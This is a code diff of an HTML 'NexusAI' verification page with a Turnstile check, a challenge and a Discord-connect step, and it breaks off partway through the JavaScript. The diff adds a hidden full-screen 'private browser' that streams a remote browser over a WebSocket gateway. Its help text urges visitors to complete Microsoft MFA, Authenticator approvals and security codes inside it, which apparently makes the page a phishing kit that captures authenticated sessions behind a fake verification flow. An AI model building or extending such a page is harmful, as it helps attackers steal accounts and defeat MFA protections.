@@ -1,24 +1,28 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
   <meta charset="UTF-8">
 
-  <meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0"
-  >
+<meta
+name="viewport"
+content="width=device-width, initial-scale=1.0"
 
-  <meta
-    name="theme-color"
-    content="#000000"
-  >
+>
 
-  <meta
-    name="description"
-    content="NexusAI secure verification"
-  >
+<meta
+name="theme-color"
+content="#000000"
 
-  <title>NexusAI • Verification</title>
+>
+
+<meta
+name="description"
+content="NexusAI secure verification and private browser access"
+
+>
+
+  <title>NexusAI • Secure Access</title>
 
   <!-- =====================================================
        FONT
@@ -58,10 +62,14 @@
     :root {
       --background: #000000;
       --card: #080808;
+      --card-2: #0d0d0d;
       --text: #ffffff;
       --muted: #8d8d96;
+      --muted-2: #5e5e67;
+
       --success: #57f287;
       --danger: #ff5365;
+      --warning: #ffcc66;
       --discord: #5865f2;
 
       --frame-radius: 28px;
@@ -89,11 +97,12 @@
       width: 100%;
       min-height: 100%;
       margin: 0;
-      background: #000000;
+      background: var(--background);
     }
 
     body {
       min-height: 100vh;
+
       color: var(--text);
 
       font-family:
@@ -175,7 +184,7 @@
     .neon-frame {
       position: relative;
 
-      width: min(460px, 100%);
+      width: min(520px, 100%);
 
       padding: 4px;
 
@@ -205,7 +214,6 @@
         0 25px 80px rgba(0, 0, 0, 0.85);
 
       isolation: isolate;
-      transform: none;
     }
 
     .neon-frame::before {
@@ -272,30 +280,6 @@
       overflow: hidden;
 
       z-index: 1;
-
-      transform: none;
-    }
-
-    .verification-card::before {
-      content: "";
-
-      position: absolute;
-
-      top: 0;
-      left: 12%;
-
-      width: 76%;
-      height: 1px;
-
-      background:
-        linear-gradient(
-          90deg,
-          transparent,
-          rgba(255, 255, 255, 0.12),
-          transparent
-        );
-
-      pointer-events: none;
     }
 
     /* =====================================================
@@ -369,7 +353,7 @@
     }
 
     /* =====================================================
-       PROGRESS
+       NORMAL VERIFICATION PROGRESS
        ===================================================== */
 
     .progress {
@@ -446,7 +430,7 @@
     }
 
     /* =====================================================
-       STEPS
+       GENERIC STEPS
        ===================================================== */
 
     .step {
@@ -495,7 +479,7 @@
     }
 
     .step p {
-      max-width: 330px;
+      max-width: 360px;
 
       margin: 12px auto 24px;
 
@@ -521,10 +505,6 @@
       margin: 22px 0 24px;
 
       overflow: visible;
-    }
-
-    .turnstile-wrapper .cf-turnstile {
-      max-width: 100%;
     }
 
     /* =====================================================
@@ -578,10 +558,6 @@
     .neon-button:disabled {
       opacity: 0.28;
       cursor: not-allowed;
-    }
-
-    .neon-button span:last-child {
-      font-size: 17px;
     }
 
     /* =====================================================
@@ -656,10 +632,6 @@
       text-align: center;
 
       font-size: 14px;
-
-      transition:
-        border-color 0.18s ease,
-        box-shadow 0.18s ease;
     }
 
     .challenge-input:focus {
@@ -714,18 +686,9 @@
         rgba(88, 101, 242, 0.24);
     }
 
-    .discord-button:active {
-      transform: translateY(0);
-    }
-
     .discord-button:disabled {
       opacity: 0.6;
       cursor: wait;
-      transform: none;
-    }
-
-    .discord-icon {
-      font-size: 17px;
     }
 
     .status {
@@ -747,10 +710,11 @@
     }
 
     /* =====================================================
-       SUCCESS
+       SUCCESS / ERROR
        ===================================================== */
 
-    .success-icon {
+    .success-icon,
+    .fatal-icon {
       width: 70px;
       height: 70px;
 
@@ -762,6 +726,11 @@
 
       border-radius: 50%;
 
+      font-size: 30px;
+      font-weight: 800;
+    }
+
+    .success-icon {
       background:
         rgba(87, 242, 135, 0.05);
 
@@ -770,13 +739,17 @@
         rgba(87, 242, 135, 0.3);
 
       color: var(--success);
+    }
 
-      font-size: 30px;
-      font-weight: 800;
+    .fatal-icon {
+      background:
+        rgba(255, 83, 101, 0.05);
 
-      box-shadow:
-        0 0 35px
-        rgba(87, 242, 135, 0.05);
+      border:
+        1px solid
+        rgba(255, 83, 101, 0.3);
+
+      color: var(--danger);
     }
 
     .success-message {
@@ -799,39 +772,6 @@
       line-height: 1.6;
     }
 
-    .success-message span {
-      margin-right: 6px;
-    }
-
-    /* =====================================================
-       FATAL ERROR
-       ===================================================== */
-
-    .fatal-icon {
-      width: 70px;
-      height: 70px;
-
-      margin: 0 auto 16px;
-
-      display: flex;
-      align-items: center;
-      justify-content: center;
-
-      border-radius: 50%;
-
-      background:
-        rgba(255, 83, 101, 0.05);
-
-      border:
-        1px solid
-        rgba(255, 83, 101, 0.3);
-
-      color: var(--danger);
-
-      font-size: 30px;
-      font-weight: 800;
-    }
-
     .secondary-button {
       margin-top: 8px;
 
@@ -847,6 +787,414 @@
       background: #1c1c1c;
 
       transform: translateY(-1px);
+    }
+
+    /* =====================================================
+       BROWSER CONTROL PAGE
+       ===================================================== */
+
+    body.browser-mode {
+      overflow: hidden;
+    }
+
+    .browser-page {
+      display: none;
+
+      position: fixed;
+
+      inset: 0;
+
+      z-index: 20;
+
+      background:
+        #050505;
+
+      color: #ffffff;
+    }
+
+    body.browser-mode .page {
+      display: none;
+    }
+
+    body.browser-mode .browser-page {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .browser-toolbar {
+      width: 100%;
+
+      min-height: 64px;
+
+      display: flex;
+      align-items: center;
+
+      gap: 12px;
+
+      padding: 10px 14px;
+
+      background: #0b0b0b;
+
+      border-bottom:
+        1px solid #1c1c1c;
+    }
+
+    .browser-brand {
+      display: flex;
+      align-items: center;
+
+      gap: 10px;
+
+      min-width: 170px;
+    }
+
+    .browser-brand-logo {
+      width: 34px;
+      height: 34px;
+
+      border-radius: 9px;
+
+      object-fit: contain;
+
+      background: #101010;
+
+      padding: 2px;
+    }
+
+    .browser-brand-text {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .browser-brand-name {
+      font-size: 13px;
+      font-weight: 800;
+    }
+
+    .browser-brand-subtitle {
+      margin-top: 2px;
+
+      color: #676770;
+
+      font-size: 9px;
+    }
+
+    .browser-nav {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .browser-tool-button {
+      width: 38px;
+      height: 38px;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border:
+        1px solid #252525;
+
+      border-radius: 10px;
+
+      background: #111111;
+
+      color: #ffffff;
+
+      font-size: 15px;
+
+      cursor: pointer;
+    }
+
+    .browser-tool-button:hover {
+      background: #181818;
+    }
+
+    .browser-url {
+      flex: 1;
+
+      min-width: 0;
+
+      height: 38px;
+
+      padding: 0 13px;
+
+      border:
+        1px solid #252525;
+
+      border-radius: 10px;
+
+      background: #080808;
+
+      color: #8b8b95;
+
+      display: flex;
+      align-items: center;
+
+      white-space: nowrap;
+
+      overflow: hidden;
+
+      text-overflow: ellipsis;
+
+      font-size: 11px;
+    }
+
+    .browser-status {
+      display: flex;
+      align-items: center;
+
+      gap: 7px;
+
+      padding:
+        8px 11px;
+
+      border-radius: 999px;
+
+      background: rgba(87, 242, 135, 0.04);
+
+      border:
+        1px solid
+        rgba(87, 242, 135, 0.14);
+
+      color: #8ed9a6;
+
+      font-size: 10px;
+
+      white-space: nowrap;
+    }
+
+    .browser-status-dot {
+      width: 6px;
+      height: 6px;
+
+      border-radius: 50%;
+
+      background: var(--success);
+
+      box-shadow:
+        0 0 8px
+        rgba(87, 242, 135, 0.65);
+    }
+
+    .browser-close {
+      min-height: 38px;
+
+      padding:
+        0 14px;
+
+      border:
+        1px solid
+        rgba(255, 83, 101, 0.22);
+
+      border-radius: 10px;
+
+      background:
+        rgba(255, 83, 101, 0.06);
+
+      color: #ff8d99;
+
+      font-size: 11px;
+      font-weight: 700;
+
+      cursor: pointer;
+    }
+
+    .browser-close:hover {
+      background:
+        rgba(255, 83, 101, 0.12);
+    }
+
+    /* =====================================================
+       BROWSER VIEW
+       ===================================================== */
+
+    .browser-content {
+      flex: 1;
+
+      min-height: 0;
+
+      display: flex;
+      flex-direction: column;
+
+      padding: 12px;
+    }
+
+    .browser-view-shell {
+      position: relative;
+
+      flex: 1;
+
+      min-height: 0;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      border:
+        1px solid #1d1d1d;
+
+      border-radius: 16px;
+
+      background:
+        #000000;
+
+      overflow: hidden;
+
+      box-shadow:
+        inset 0 1px 0
+        rgba(255, 255, 255, 0.02),
+        0 20px 60px
+        rgba(0, 0, 0, 0.3);
+    }
+
+    .browser-canvas {
+      position: relative;
+
+      width: 100%;
+      height: 100%;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      cursor: default;
+      user-select: none;
+    }
+
+    .browser-screenshot {
+      display: block;
+
+      max-width: 100%;
+      max-height: 100%;
+
+      width: auto;
+      height: auto;
+
+      object-fit: contain;
+
+      user-select: none;
+      -webkit-user-drag: none;
+
+      background: #000000;
+    }
+
+    .browser-loading {
+      position: absolute;
+
+      inset: 0;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      flex-direction: column;
+
+      gap: 12px;
+
+      color: #707079;
+
+      background:
+        rgba(0, 0, 0, 0.72);
+
+      backdrop-filter:
+        blur(7px);
+
+      z-index: 3;
+    }
+
+    .browser-loading.hidden {
+      display: none;
+    }
+
+    .browser-loading-spinner {
+      width: 26px;
+      height: 26px;
+
+      border:
+        3px solid #242424;
+
+      border-top-color:
+        #ffffff;
+
+      border-radius: 50%;
+
+      animation:
+        spin
+        0.8s linear infinite;
+    }
+
+    .browser-loading-text {
+      font-size: 12px;
+    }
+
+    .browser-banner {
+      display: none;
+
+      position: absolute;
+
+      top: 14px;
+      left: 50%;
+
+      transform:
+        translateX(-50%);
+
+      z-index: 5;
+
+      max-width:
+        calc(100% - 28px);
+
+      padding:
+        10px 14px;
+
+      border-radius: 10px;
+
+      background:
+        rgba(12, 12, 12, 0.94);
+
+      border:
+        1px solid #252525;
+
+      color: #d5d5db;
+
+      font-size: 11px;
+
+      box-shadow:
+        0 14px 30px
+        rgba(0, 0, 0, 0.35);
+    }
+
+    .browser-banner.visible {
+      display: block;
+    }
+
+    /* =====================================================
+       MFA HELP
+       ===================================================== */
+
+    .browser-help {
+      margin-top: 10px;
+
+      padding:
+        11px 14px;
+
+      border-radius: 11px;
+
+      background: #090909;
+
+      border:
+        1px solid #1d1d1d;
+
+      color: #878791;
+
+      font-size: 11px;
+
+      line-height: 1.55;
+    }
+
+    .browser-help strong {
+      color: #ffffff;
     }
 
     /* =====================================================
@@ -906,28 +1254,68 @@
     @keyframes step-in {
       from {
         opacity: 0;
-        transform: translateY(10px);
+        transform:
+          translateY(10px);
       }
 
       to {
         opacity: 1;
-        transform: translateY(0);
+        transform:
+          translateY(0);
       }
     }
 
     @keyframes spin {
       from {
-        transform: rotate(0deg);
+        transform:
+          rotate(0deg);
       }
 
       to {
-        transform: rotate(360deg);
+        transform:
+          rotate(360deg);
       }
     }
 
     /* =====================================================
        MOBILE
        ===================================================== */
+
+    @media (max-width: 800px) {
+      .browser-brand {
+        min-width: auto;
+      }
+
+      .browser-brand-text {
+        display: none;
+      }
+
+      .browser-status {
+        display: none;
+      }
+
+      .browser-toolbar {
+        gap: 7px;
+
+        padding:
+          8px;
+      }
+
+      .browser-tool-button {
+        width: 34px;
+        height: 34px;
+      }
+
+      .browser-close {
+        min-height: 34px;
+        padding: 0 10px;
+      }
+
+      .browser-url {
+        height: 34px;
+        font-size: 10px;
+      }
+    }
 
     @media (max-width: 520px) {
       .page {
@@ -941,7 +1329,9 @@
 
       .verification-card {
         min-height: 540px;
-        padding: 28px 22px;
+
+        padding:
+          28px 22px;
       }
 
       .brand {
@@ -969,23 +1359,13 @@
         width: 38px;
         height: 38px;
       }
-    }
 
-    @media (max-width: 360px) {
-      .page {
-        padding: 8px;
+      .browser-content {
+        padding: 7px;
       }
 
-      .verification-card {
-        padding: 24px 17px;
-      }
-
-      .brand {
-        left: 17px;
-      }
-
-      .step h1 {
-        font-size: 22px;
+      .browser-help {
+        display: none;
       }
     }
 
@@ -997,7 +1377,8 @@
       .neon-frame,
       .neon-frame::before,
       .step,
-      .button-spinner {
+      .button-spinner,
+      .browser-loading-spinner {
         animation: none !important;
       }
 
@@ -1009,6 +1390,7 @@
       }
     }
   </style>
+
 </head>
 
 <body>
@@ -1033,380 +1415,535 @@
   ></div>
 
   <!-- =====================================================
-       MAIN
+       NORMAL VERIFICATION PAGE
        ===================================================== -->
 
   <main class="page">
 
-    <div class="neon-frame">
+```
+<div class="neon-frame">
 
-      <div class="verification-card">
+  <div class="verification-card">
 
-        <!-- =================================================
-             BRAND
-             ================================================= -->
+    <!-- BRAND -->
 
-        <header class="brand">
+    <header class="brand">
 
-          <div class="logo">
-            <img
-              src="./standard.png"
-              alt="NexusAI"
-              class="logo-image"
-            >
-          </div>
-
-          <div class="brand-text">
-            <div class="brand-name">
-              NexusAI
-            </div>
-
-            <div class="brand-subtitle">
-              Secure Verification
-            </div>
-          </div>
-
-        </header>
-
-        <!-- =================================================
-             PROGRESS
-             ================================================= -->
-
-        <div
-          class="progress"
-          aria-label="Verification progress"
+      <div class="logo">
+        <img
+          src="./standard.png"
+          alt="NexusAI"
+          class="logo-image"
         >
+      </div>
 
-          <div
-            class="progress-step active"
-            id="progress-1"
-          >
-            <span>1</span>
-          </div>
+      <div class="brand-text">
 
-          <div
-            class="progress-line"
-            aria-hidden="true"
-          ></div>
-
-          <div
-            class="progress-step"
-            id="progress-2"
-          >
-            <span>2</span>
-          </div>
-
-          <div
-            class="progress-line"
-            aria-hidden="true"
-          ></div>
-
-          <div
-            class="progress-step"
-            id="progress-3"
-          >
-            <span>3</span>
-          </div>
-
+        <div class="brand-name">
+          NexusAI
         </div>
 
-        <!-- =================================================
-             STEP 1
-             ================================================= -->
+        <div class="brand-subtitle">
+          Secure Verification
+        </div>
 
-        <section
-          id="step-1"
-          class="step active"
-          aria-labelledby="step1-title"
-        >
+      </div>
 
-          <div
-            class="step-icon"
-            aria-hidden="true"
-          >
-            🛡️
-          </div>
+    </header>
 
-          <div class="step-label">
-            STEP 01
-          </div>
+    <!-- PROGRESS -->
 
-          <h1 id="step1-title">
-            Verify you're human
-          </h1>
+    <div
+      class="progress"
+      aria-label="Verification progress"
+    >
 
-          <p>
-            Complete the security check below
-            before continuing.
-          </p>
+      <div
+        class="progress-step active"
+        id="progress-1"
+      >
+        <span>1</span>
+      </div>
 
-          <div class="turnstile-wrapper">
+      <div
+        class="progress-line"
+        aria-hidden="true"
+      ></div>
 
-            <div
-              class="cf-turnstile"
-              data-sitekey="0x4AAAAAAEb1Pia85lYxvMZc"
-              data-theme="dark"
-              data-size="flexible"
-              data-callback="turnstileCompleted"
-              data-error-callback="turnstileFailed"
-              data-expired-callback="turnstileExpired"
-            ></div>
+      <div
+        class="progress-step"
+        id="progress-2"
+      >
+        <span>2</span>
+      </div>
 
-          </div>
+      <div
+        class="progress-line"
+        aria-hidden="true"
+      ></div>
 
-          <button
-            id="continue-step-1"
-            class="neon-button"
-            type="button"
-            disabled
-          >
-            <span class="button-text">
-              Continue
-            </span>
-
-            <span aria-hidden="true">
-              →
-            </span>
-          </button>
-
-        </section>
-
-        <!-- =================================================
-             STEP 2
-             ================================================= -->
-
-        <section
-          id="step-2"
-          class="step"
-          aria-labelledby="step2-title"
-        >
-
-          <div
-            class="step-icon"
-            aria-hidden="true"
-          >
-            🧠
-          </div>
-
-          <div class="step-label">
-            STEP 02
-          </div>
-
-          <h1 id="step2-title">
-            NexusAI Challenge
-          </h1>
-
-          <p>
-            Complete the challenge to continue
-            verification.
-          </p>
-
-          <div class="challenge">
-
-            <div
-              id="challenge-question"
-              class="challenge-question"
-              aria-live="polite"
-            >
-              Loading challenge...
-            </div>
-
-            <input
-              id="challenge-answer"
-              class="challenge-input"
-              type="text"
-              autocomplete="off"
-              autocapitalize="none"
-              spellcheck="false"
-              inputmode="numeric"
-              placeholder="Enter your answer"
-              aria-label="Challenge answer"
-            >
-
-            <button
-              id="challenge-submit"
-              class="neon-button"
-              type="button"
-            >
-              <span>
-                Verify Answer
-              </span>
-
-              <span aria-hidden="true">
-                →
-              </span>
-            </button>
-
-            <div
-              id="challenge-error"
-              class="error"
-              role="alert"
-              aria-live="assertive"
-            ></div>
-
-          </div>
-
-        </section>
-
-        <!-- =================================================
-             STEP 3
-             ================================================= -->
-
-        <section
-          id="step-3"
-          class="step"
-          aria-labelledby="step3-title"
-        >
-
-          <div
-            class="step-icon"
-            aria-hidden="true"
-          >
-            💬
-          </div>
-
-          <div class="step-label">
-            STEP 03
-          </div>
-
-          <h1 id="step3-title">
-            Connect Discord
-          </h1>
-
-          <p>
-            Connect your Discord account to finish
-            verification.
-          </p>
-
-          <button
-            id="discord-login"
-            class="discord-button"
-            type="button"
-          >
-
-            <span
-              class="discord-icon"
-              aria-hidden="true"
-            >
-              ◈
-            </span>
-
-            <span class="discord-button-text">
-              Connect Discord
-            </span>
-
-          </button>
-
-          <div
-            id="discord-status"
-            class="status"
-            role="status"
-            aria-live="polite"
-          ></div>
-
-        </section>
-
-        <!-- =================================================
-             SUCCESS
-             ================================================= -->
-
-        <section
-          id="success"
-          class="step"
-          aria-labelledby="success-title"
-        >
-
-          <div
-            class="success-icon"
-            aria-hidden="true"
-          >
-            ✓
-          </div>
-
-          <div class="step-label">
-            COMPLETE
-          </div>
-
-          <h1 id="success-title">
-            Verification complete
-          </h1>
-
-          <p>
-            Your Discord account has been
-            successfully verified.
-          </p>
-
-          <div class="success-message">
-            <span aria-hidden="true">
-              🥭
-            </span>
-
-            Welcome to NexusAI.
-          </div>
-
-        </section>
-
-        <!-- =================================================
-             ERROR
-             ================================================= -->
-
-        <section
-          id="fatal-error"
-          class="step"
-          aria-labelledby="fatal-error-title"
-        >
-
-          <div
-            class="fatal-icon"
-            aria-hidden="true"
-          >
-            !
-          </div>
-
-          <div class="step-label">
-            ERROR
-          </div>
-
-          <h1 id="fatal-error-title">
-            Verification failed
-          </h1>
-
-          <p
-            id="fatal-error-message"
-            role="alert"
-            aria-live="assertive"
-          >
-            Something went wrong.
-          </p>
-
-          <button
-            id="retry-button"
-            class="secondary-button"
-            type="button"
-          >
-            Try Again
-          </button>
-
-        </section>
-
-        <!-- =================================================
-             FOOTER
-             ================================================= -->
-
-        <footer>
-          <span
-            class="status-dot"
-            aria-hidden="true"
-          ></span>
-
-          NexusAI Secure Verification
-        </footer>
-
+      <div
+        class="progress-step"
+        id="progress-3"
+      >
+        <span>3</span>
       </div>
 
     </div>
 
+    <!-- STEP 1 -->
+
+    <section
+      id="step-1"
+      class="step active"
+      aria-labelledby="step1-title"
+    >
+
+      <div
+        class="step-icon"
+        aria-hidden="true"
+      >
+        🛡️
+      </div>
+
+      <div class="step-label">
+        STEP 01
+      </div>
+
+      <h1 id="step1-title">
+        Verify you're human
+      </h1>
+
+      <p>
+        Complete the security check below
+        before continuing.
+      </p>
+
+      <div class="turnstile-wrapper">
+
+        <div
+          class="cf-turnstile"
+          data-sitekey="0x4AAAAAAEb1Pia85lYxvMZc"
+          data-theme="dark"
+          data-size="flexible"
+          data-callback="turnstileCompleted"
+          data-error-callback="turnstileFailed"
+          data-expired-callback="turnstileExpired"
+        ></div>
+
+      </div>
+
+      <button
+        id="continue-step-1"
+        class="neon-button"
+        type="button"
+        disabled
+      >
+        <span>
+          Continue
+        </span>
+
+        <span aria-hidden="true">
+          →
+        </span>
+      </button>
+
+    </section>
+
+    <!-- STEP 2 -->
+
+    <section
+      id="step-2"
+      class="step"
+      aria-labelledby="step2-title"
+    >
+
+      <div
+        class="step-icon"
+        aria-hidden="true"
+      >
+        🧠
+      </div>
+
+      <div class="step-label">
+        STEP 02
+      </div>
+
+      <h1 id="step2-title">
+        NexusAI Challenge
+      </h1>
+
+      <p>
+        Complete the challenge to continue
+        verification.
+      </p>
+
+      <div class="challenge">
+
+        <div
+          id="challenge-question"
+          class="challenge-question"
+          aria-live="polite"
+        >
+          Loading challenge...
+        </div>
+
+        <input
+          id="challenge-answer"
+          class="challenge-input"
+          type="text"
+          autocomplete="off"
+          autocapitalize="none"
+          spellcheck="false"
+          inputmode="numeric"
+          placeholder="Enter your answer"
+          aria-label="Challenge answer"
+        >
+
+        <button
+          id="challenge-submit"
+          class="neon-button"
+          type="button"
+        >
+          <span>
+            Verify Answer
+          </span>
+
+          <span aria-hidden="true">
+            →
+          </span>
+        </button>
+
+        <div
+          id="challenge-error"
+          class="error"
+          role="alert"
+          aria-live="assertive"
+        ></div>
+
+      </div>
+
+    </section>
+
+    <!-- STEP 3 -->
+
+    <section
+      id="step-3"
+      class="step"
+      aria-labelledby="step3-title"
+    >
+
+      <div
+        class="step-icon"
+        aria-hidden="true"
+      >
+        💬
+      </div>
+
+      <div class="step-label">
+        STEP 03
+      </div>
+
+      <h1 id="step3-title">
+        Connect Discord
+      </h1>
+
+      <p>
+        Connect your Discord account to finish
+        verification.
+      </p>
+
+      <button
+        id="discord-login"
+        class="discord-button"
+        type="button"
+      >
+        <span aria-hidden="true">
+          ◈
+        </span>
+
+        <span>
+          Connect Discord
+        </span>
+      </button>
+
+      <div
+        id="discord-status"
+        class="status"
+        role="status"
+        aria-live="polite"
+      ></div>
+
+    </section>
+
+    <!-- SUCCESS -->
+
+    <section
+      id="success"
+      class="step"
+      aria-labelledby="success-title"
+    >
+
+      <div
+        class="success-icon"
+        aria-hidden="true"
+      >
+        ✓
+      </div>
+
+      <div class="step-label">
+        COMPLETE
+      </div>
+
+      <h1 id="success-title">
+        Verification complete
+      </h1>
+
+      <p>
+        Your Discord account has been
+        successfully verified.
+      </p>
+
+      <div class="success-message">
+        <span aria-hidden="true">
+          🥭
+        </span>
+
+        Welcome to NexusAI.
+      </div>
+
+    </section>
+
+    <!-- ERROR -->
+
+    <section
+      id="fatal-error"
+      class="step"
+      aria-labelledby="fatal-error-title"
+    >
+
+      <div
+        class="fatal-icon"
+        aria-hidden="true"
+      >
+        !
+      </div>
+
+      <div class="step-label">
+        ERROR
+      </div>
+
+      <h1 id="fatal-error-title">
+        Verification failed
+      </h1>
+
+      <p
+        id="fatal-error-message"
+        role="alert"
+        aria-live="assertive"
+      >
+        Something went wrong.
+      </p>
+
+      <button
+        id="retry-button"
+        class="secondary-button"
+        type="button"
+      >
+        Try Again
+      </button>
+
+    </section>
+
+    <!-- FOOTER -->
+
+    <footer>
+      <span
+        class="status-dot"
+        aria-hidden="true"
+      ></span>
+
+      NexusAI Secure Verification
+    </footer>
+
+  </div>
+
+</div>
+```
+
   </main>
+
+  <!-- =====================================================
+       PRIVATE BROWSER CONTROL PAGE
+       ===================================================== -->
+
+  <section
+    id="browser-page"
+    class="browser-page"
+    aria-label="Private browser control"
+  >
+
+```
+<!-- TOOLBAR -->
+
+<div class="browser-toolbar">
+
+  <div class="browser-brand">
+
+    <img
+      src="./standard.png"
+      alt="NexusAI"
+      class="browser-brand-logo"
+    >
+
+    <div class="browser-brand-text">
+
+      <div class="browser-brand-name">
+        NexusAI Browser
+      </div>
+
+      <div class="browser-brand-subtitle">
+        Private login session
+      </div>
+
+    </div>
+
+  </div>
+
+  <div class="browser-nav">
+
+    <button
+      id="browser-back"
+      class="browser-tool-button"
+      type="button"
+      title="Back"
+      aria-label="Back"
+    >
+      ←
+    </button>
+
+    <button
+      id="browser-forward"
+      class="browser-tool-button"
+      type="button"
+      title="Forward"
+      aria-label="Forward"
+    >
+      →
+    </button>
+
+    <button
+      id="browser-reload"
+      class="browser-tool-button"
+      type="button"
+      title="Reload"
+      aria-label="Reload"
+    >
+      ↻
+    </button>
+
+  </div>
+
+  <div
+    id="browser-url"
+    class="browser-url"
+    aria-live="polite"
+  >
+    Connecting...
+  </div>
+
+  <div
+    id="browser-status"
+    class="browser-status"
+  >
+
+    <span
+      class="browser-status-dot"
+      aria-hidden="true"
+    ></span>
+
+    <span id="browser-status-text">
+      Connecting
+    </span>
+
+  </div>
+
+  <button
+    id="browser-close"
+    class="browser-close"
+    type="button"
+  >
+    Close Browser
+  </button>
+
+</div>
+
+<!-- VIEW -->
+
+<div class="browser-content">
+
+  <div
+    id="browser-view-shell"
+    class="browser-view-shell"
+  >
+
+    <div
+      id="browser-canvas"
+      class="browser-canvas"
+      tabindex="0"
+      aria-label="Private browser viewport"
+    >
+
+      <img
+        id="browser-screenshot"
+        class="browser-screenshot"
+        alt="Private browser"
+        draggable="false"
+      >
+
+    </div>
+
+    <div
+      id="browser-loading"
+      class="browser-loading"
+    >
+
+      <div
+        class="browser-loading-spinner"
+        aria-hidden="true"
+      ></div>
+
+      <div
+        id="browser-loading-text"
+        class="browser-loading-text"
+      >
+        Connecting to your private browser...
+      </div>
+
+    </div>
+
+    <div
+      id="browser-banner"
+      class="browser-banner"
+      role="status"
+      aria-live="polite"
+    ></div>
+
+  </div>
+
+  <div class="browser-help">
+    <strong>Complete MFA here.</strong>
+    This private browser belongs to your login session.
+    Use the mouse and keyboard normally to complete Microsoft
+    phone verification, Authenticator approval, number matching,
+    security codes, “Keep your account secure”, and other
+    Microsoft security prompts.
+  </div>
+
+</div>
+```
+
+  </section>
 
   <!-- =====================================================
        JAVASCRIPT
@@ -1420,50 +1957,147 @@
        ===================================================== */
 
     const CONFIG = {
+
+      /*
+       * Your existing verification backend.
+       */
       API_BASE:
-        "https://nexusai-verification.aajensenthooran23.workers.dev"
+        "https://nexusai-verification.aajensenthooran23.workers.dev",
+
+      /*
+       * PUBLIC BROWSER GATEWAY
+       *
+       * IMPORTANT:
+       *
+       * Because this page is served over HTTPS, this should
+       * ultimately use WSS.
+       *
+       * Example:
+       *
+       * https://browser.example.com
+       *
+       * becomes:
+       *
+       * wss://browser.example.com/browser
+       *
+       * The current gateway path is /browser.
+       */
+      BROWSER_GATEWAY_URL:
+        "wss://YOUR-PUBLIC-BROWSER-GATEWAY/browser",
+
+      /*
+       * Browser screenshot behaviour.
+       */
+      SCREENSHOT_UPDATE_MS:
+        200,
+
+      /*
+       * Command throttling.
+       */
+      MOUSE_MOVE_THROTTLE_MS:
+        40
     };
 
     /* =====================================================
-       STATE
+       NORMAL VERIFICATION STATE
        ===================================================== */
 
-    let turnstileToken = null;
-    let verificationToken = null;
+    let turnstileToken =
+      null;
 
-    let isStartingVerification = false;
-    let isSubmittingChallenge = false;
-    let isConnectingDiscord = false;
+    let verificationToken =
+      null;
+
+    let isStartingVerification =
+      false;
+
+    let isSubmittingChallenge =
+      false;
+
+    let isConnectingDiscord =
+      false;
 
     /* =====================================================
-       HELPERS
+       BROWSER STATE
+       ===================================================== */
+
+    let browserMode =
+      false;
+
+    let browserToken =
+      null;
+
+    let browserSocket =
+      null;
+
+    let browserConnected =
+      false;
+
+    let browserPointerDown =
+      false;
+
+    let lastMouseMoveAt =
+      0;
+
+    /* =====================================================
+       DOM HELPERS
        ===================================================== */
 
     function byId(id) {
       return document.getElementById(id);
     }
 
+    function sleep(milliseconds) {
+      return new Promise(
+        resolve =>
+          setTimeout(
+            resolve,
+            milliseconds
+          )
+      );
+    }
+
+    /* =====================================================
+       NORMAL UI
+       ===================================================== */
+
     function getSteps() {
       return Array.from(
-        document.querySelectorAll(".step")
+        document.querySelectorAll(
+          ".step"
+        )
       );
     }
 
     function showStep(number) {
-      getSteps().forEach(step => {
-        step.classList.remove("active");
-      });
+      getSteps().forEach(
+        step => {
+          step.classList.remove(
+            "active"
+          );
+        }
+      );
 
       const target =
-        byId(`step-${number}`);
+        byId(
+          `step-${number}`
+        );
 
       if (target) {
-        target.classList.add("active");
+        target.classList.add(
+          "active"
+        );
       }
 
-      for (let i = 1; i <= 3; i++) {
+      for (
+        let i = 1;
+        i <= 3;
+        i++
+      ) {
         const progress =
-          byId(`progress-${i}`);
+          byId(
+            `progress-${i}`
+          );
 
         if (!progress) {
           continue;
@@ -1475,41 +2109,68 @@
         );
 
         if (i < number) {
-          progress.classList.add("complete");
+          progress.classList.add(
+            "complete"
+          );
         }
 
         if (i === number) {
-          progress.classList.add("active");
+          progress.classList.add(
+            "active"
+          );
         }
       }
     }
 
     function showSuccess() {
-      getSteps().forEach(step => {
-        step.classList.remove("active");
-      });
+      getSteps().forEach(
+        step => {
+          step.classList.remove(
+            "active"
+          );
+        }
+      );
 
       byId("success")
-        ?.classList.add("active");
+        ?.classList.add(
+          "active"
+        );
 
       document
-        .querySelectorAll(".progress-step")
-        .forEach(element => {
-          element.classList.remove("active");
-          element.classList.add("complete");
-        });
+        .querySelectorAll(
+          ".progress-step"
+        )
+        .forEach(
+          element => {
+            element.classList.remove(
+              "active"
+            );
+
+            element.classList.add(
+              "complete"
+            );
+          }
+        );
     }
 
     function showFatalError(message) {
-      getSteps().forEach(step => {
-        step.classList.remove("active");
-      });
+      getSteps().forEach(
+        step => {
+          step.classList.remove(
+            "active"
+          );
+        }
+      );
 
       byId("fatal-error")
-        ?.classList.add("active");
+        ?.classList.add(
+          "active"
+        );
 
       const errorElement =
-        byId("fatal-error-message");
+        byId(
+          "fatal-error-message"
+        );
 
       if (errorElement) {
         errorElement.textContent =
@@ -1523,7 +2184,9 @@
       type = "normal"
     ) {
       const element =
-        byId("discord-status");
+        byId(
+          "discord-status"
+        );
 
       if (!element) {
         return;
@@ -1546,19 +2209,27 @@
       }
 
       if (loading) {
-        if (!button.dataset.originalHtml) {
+
+        if (
+          !button.dataset.originalHtml
+        ) {
           button.dataset.originalHtml =
             button.innerHTML;
         }
 
-        button.disabled = true;
+        button.disabled =
+          true;
 
         button.innerHTML = `
           <span class="button-spinner"></span>
           <span>${text}</span>
         `;
+
       } else {
-        if (button.dataset.originalHtml) {
+
+        if (
+          button.dataset.originalHtml
+        ) {
           button.innerHTML =
             button.dataset.originalHtml;
         }
@@ -1571,40 +2242,55 @@
 
     window.turnstileCompleted =
       function(token) {
+
         turnstileToken =
           token || null;
 
         const button =
-          byId("continue-step-1");
+          byId(
+            "continue-step-1"
+          );
 
         if (button) {
           button.disabled =
